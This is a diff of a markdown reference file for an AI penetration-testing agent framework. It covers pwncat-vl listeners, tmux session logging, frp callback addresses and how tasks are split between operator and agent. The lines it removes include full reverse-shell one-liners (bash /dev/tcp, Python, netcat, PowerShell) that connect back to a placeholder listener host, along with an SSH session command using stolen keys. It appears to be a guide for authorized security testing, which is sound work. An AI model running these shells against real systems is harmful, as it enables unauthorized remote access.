@@ -1,146 +1,55 @@
 ---
-description: pwncat-vl listeners, tmux session management, reverse shell payloads, log tailing for LLM visibility — paired with `agent/skills/exploit-playbook-authoring/SKILL.md` for playbook bash structure and `# MANUAL:` annotation conventions
+description: pwncat-vl listener commands, tmux session and log conventions, `.listener_url` callback addresses for reverse shells — paired with `agent/skills/exploit-playbook-authoring/SKILL.md` for playbook bash structure and `# MANUAL:` annotation conventions
 skill: exploit-playbook-authoring
 ---
 
 # Shell Handling & Post-Exploitation Listeners
 
-## Architecture
+## Who runs what
 
-Listeners (pwncat-vl) are OPERATOR-CONTROLLED shared infrastructure.
-Agents must never start them. The Kali runtime is shared across engagements — an agent
-starting a listener on port 4444 could conflict with another engagement's listener.
+Listeners (pwncat-vl), frp tunnels and `chisel server` are operator-controlled shared
+infrastructure (`agent/shared-constraints.md` §2a): the Kali runtime is shared across
+engagements, so a listener an agent starts on 4444 can collide with another engagement's.
 
-**Agent responsibility:** provide the exact commands in `# MANUAL:` playbook steps.
-**Operator responsibility:** execute them, record tunnel address in `$DIR/.listener_url`, then signal the agent to continue.
+- The agent writes the exact listener command as a `# MANUAL:` playbook step, supplies the
+  reverse-shell payload, and waits for the operator's confirmation before continuing past it.
+- The operator runs it, exposes it through frp, and records the address in `$DIR/.listener_url`.
+- The agent reads `LISTENER_HOST:LISTENER_PORT` from `$DIR/.listener_url` (or dispatch context)
+  and never hardcodes a tunnel address. Without the file, record a blocked technique (`agent/shared-constraints.md` §12).
+- Agents leave existing listener and tunnel sessions running; stopping one breaks whoever else
+  is using it.
 
-For exposing listeners to remote targets via tunnels, see `agent/references/offensive-tactics/frp-tunneling.md`.
-For OOB callback servers (interactsh) and blind vulnerability detection, see `agent/references/offensive-tactics/frp-tunneling.md`.
+Tunnel exposure and OOB callbacks (interactsh) are in
+`agent/references/offensive-tactics/frp-tunneling.md`. The `oob-rev` proxy that `vigil oob start`
+renders in `/data/oob/frpc.toml` exposes the listener; once `vigil oob status` is healthy the
+operator records it, e.g. `echo "<frp-host>:8443" > "$DIR/.listener_url"`.
 
-## pwncat-vl Listener Commands
+## pwncat-vl listener commands
 
-pwncat-vl is the maintained fork of pwncat-cs with Python 3.13+ support.
+pwncat-vl is the maintained fork of pwncat-cs (Python 3.13+). Run each session in a named tmux
+session with output teed to `/data/`, which is the shared runtime data mount, so the log survives
+tmux restarts and agents can read it:
 
-### Basic TCP listener
 ```bash
 vigil runtime shell-exec "tmux new-session -d -s shell-4444 'pwncat -l -p 4444 2>&1 | tee /data/shell-4444.log'"
 ```
 
-### SSL/TLS listener
-```bash
-vigil runtime shell-exec "tmux new-session -d -s shell-ssl 'pwncat -l -p 4444 --ssl 2>&1 | tee /data/shell-ssl.log'"
-```
+The same shape covers `--ssl` listeners, bind shells (`pwncat -c TARGET_IP -p 4444`), and SSH
+sessions with recovered keys (`pwncat -c TARGET_IP -p 22 --ssh --identity /data/<key>`).
 
-### Connecting to a bind shell
-```bash
-vigil runtime shell-exec "tmux new-session -d -s shell-bind 'pwncat -c TARGET_IP -p 4444 2>&1 | tee /data/shell-bind.log'"
-```
+Naming: shell sessions are `shell-<port>` or `shell-<tag>`; tunnel sessions are `frp-<name>`.
 
-### SSH-based session (with stolen credentials)
-```bash
-vigil runtime shell-exec "tmux new-session -d -s shell-ssh 'pwncat -c TARGET_IP -p 22 --ssh --identity /data/stolen_key 2>&1 | tee /data/shell-ssh.log'"
-```
+## Observing a session
 
-## tmux Session Management
-
-### Naming convention
-Shell sessions are named `shell-<port>` or `shell-<descriptive-tag>`.
-Tunnel sessions use `frp-<name>` (see `frp-tunneling.md`).
-
-### Common commands
-Interactive tmux attach is only for manual operator debugging outside agent-executed playbooks.
+Agents read shell output through `vigil runtime shell-exec` because listeners are shared runtime
+infrastructure, not target-facing probes:
 
 ```bash
-# List active sessions
 vigil runtime shell-exec "tmux list-sessions"
-
-# Send a command to a running session (non-interactive)
-vigil runtime shell-exec "tmux send-keys -t shell-4444 'whoami' Enter"
-
-# Read recent output from the log
-vigil runtime shell-exec "tail -50 /data/shell-4444.log"
-
-# Kill a session when done
-vigil runtime shell-exec "tmux kill-session -t shell-4444"
+vigil runtime shell-exec "tail -80 /data/shell-4444.log"
+vigil runtime shell-exec "tmux send-keys -t shell-4444 'whoami' Enter"   # for the operator to run
 ```
 
-### Log file visibility
-
-Agents observe shell output through `vigil runtime shell-exec` because shell
-listeners are shared runtime infrastructure, not target-facing probes. Record
-the important result afterward in the finding, probe-run, or handoff so the
-backend remains the durable source of engagement state.
-
-```bash
-# Recent shell session output
-vigil runtime shell-exec "tail -100 /data/shell-4444.log"
-
-# Full shell session output
-vigil runtime shell-exec "cat /data/shell-4444.log"
-```
-
-Log files under `/data/` persist across tmux restarts because `/data` is the
-shared runtime data mount point.
-
-## Exposing Listeners Externally
-
-After starting a pwncat listener, it is only reachable from the local container network.
-To expose it to remote targets, set up an frp tunnel.
-
-**Full tunnel setup commands:** `agent/references/offensive-tactics/frp-tunneling.md`
-
-The `oob-rev` proxy rendered by `vigil oob start` in `/data/oob/frpc.toml` handles this. After `vigil oob start` is healthy, record the address:
-```bash
-echo "<frp-host>:8443" > "$DIR/.listener_url"
-```
-
-Agents read `LISTENER_HOST` and `LISTENER_PORT` from `$DIR/.listener_url` (or from dispatch context)
-instead of hardcoding tunnel addresses.
-
-## Reverse Shell Payloads
-
-These are what agents embed in exploit commands. The `LISTENER_HOST` and `LISTENER_PORT`
-values come from the operator after they set up the listener and tunnel.
-
-### Linux
-```bash
-# Bash TCP
-bash -i >& /dev/tcp/LISTENER_HOST/LISTENER_PORT 0>&1
-
-# Python3
-python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("LISTENER_HOST",LISTENER_PORT));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
-
-# Netcat (if available on target)
-nc -e /bin/bash LISTENER_HOST LISTENER_PORT
-
-# Netcat without -e
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc LISTENER_HOST LISTENER_PORT >/tmp/f
-```
-
-### Windows
-```powershell
-# PowerShell one-liner
-powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('LISTENER_HOST',LISTENER_PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)};$c.Close()"
-```
-
-## Agent Rules
-
-Agents **MUST NOT:**
-- Start `pwncat`, `nc -lvp`, `socat` as a listener, or any listening socket
-- Start frp tunnels or `chisel server`
-- Kill or restart existing listener or tunnel sessions
-
-Agents **CAN:**
-- Read listener log files with `vigil runtime shell-exec "tail -80 /data/shell-<name>.log"`, then record the meaningful result in the backend
-- Read correlated OOB hits with `vigil oob poll --client <name> --json` (the nonce↔probe matches); `vigil oob client logs <name> --lines 80` is the raw per-client listener tail, not correlation
-- Read raw OOB infrastructure logs with `vigil logs oob --lines 80`
-- Provide reverse shell payloads for the operator to deploy
-- Verify that a shell connected by checking log output
-- Provide authorized runtime commands such as `vigil runtime shell-exec "tmux send-keys -t shell-4444 'whoami' Enter"` for the operator to run
-
-Agents **MUST:**
-- Mark shell-catching steps as `# MANUAL:` in playbooks
-- Include the full listener commands the operator should run
-- Reference this file (`agent/references/offensive-tactics/shell-handling.md`) for listener setup
-- Reference `agent/references/offensive-tactics/frp-tunneling.md` for tunnel and OOB setup
-- Wait for operator confirmation before proceeding past a manual step
+Record what the log shows (shell connected, command output) in the finding, probe-run or handoff;
+the backend is the durable record, the log is not. Interactive `tmux attach` is for manual operator
+debugging only.
